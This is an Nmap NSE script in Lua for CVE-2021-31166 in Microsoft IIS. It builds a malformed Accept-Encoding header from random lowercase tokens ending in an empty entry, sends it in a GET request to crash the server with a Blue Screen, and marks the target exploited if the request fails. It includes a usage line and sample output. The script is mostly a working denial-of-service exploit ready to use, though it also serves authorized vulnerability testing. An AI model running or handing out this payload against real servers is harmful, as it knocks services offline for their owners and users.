description = [[
  The IIS Web Server contains a RCE vulnerability. This script
  exploits this vulnerability with a DOS attack (causes a Blue Screen).
]]

author = "Maurice LAMBERT <mauricelambert434@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos", "exploit", "intrusive", "vuln"}

---
-- @name
-- IIS DOS CVE-2021-31166 - Web Server Blue Screen
-- @author
-- Maurice LAMBERT <mauricelambert434@gmail.com>
-- @usage
-- nmap -p 80 --script dos_iis_2021_31166 <target>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | dos_iis_2021_31166:
-- |   VULNERABLE:
-- |   IIS CVE-2021-31166 DOS
-- |   State: VULNERABLE (Exploitable)
-- |   IDs:  CVE:CVE-2021-31166
-- |           The IIS Web Server contains a RCE vulnerability. This script
-- |           exploits this vulnerability with a DOS attack
-- |           (causes a Blue Screen).
-- |
-- |   Disclosure date: 2021-05-11
-- |   References:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2021-31166
-- |     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31166
-- |_    https://github.com/mauricelambert/CVE-2021-31166

local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local http = require "http"

portrule = shortport.http

local function random_payload()
  local value = ""
  local payload = ""

  for j = 1, math.random(2, 5) do
  
    value = ""
    for i = 1, math.random(2, 5) do
      value = value .. string.char(math.random(97, 122))
    end
  
    payload = payload .. value .. ", "
  end

  return payload .. ","
end

action = function(host, port)
  local vuln = {
    title = "IIS CVE-2021-31166 DOS",
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2021-31166' },
    description = [[
      The IIS Web Server contains a RCE vulnerability. This script
      exploits this vulnerability with a DOS attack
      (causes a Blue Screen).
    ]],
    references = {
       'https://nvd.nist.gov/vuln/detail/CVE-2021-31166',
       'https://github.com/mauricelambert/CVE-2021-31166',
     },
     dates = {
       disclosure = {year = '2021', month = '05', day = '11'},
     },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local headers = {}
  headers["Accept-Encoding"] = random_payload()

  stdnse.debug2("Web service is up. Send payload...")
  local response = http.generic_request(
    host,
    port,
    "GET",
    "/",
    {
      timeout = 10,
      header = headers,
    }
  )

  if (response.status) then
    return report:make_output(vuln)
  else
    vuln.state = vulns.STATE.EXPLOIT -- UNKNOWN, LIKELY_VULN
    return report:make_output(vuln)
  end
end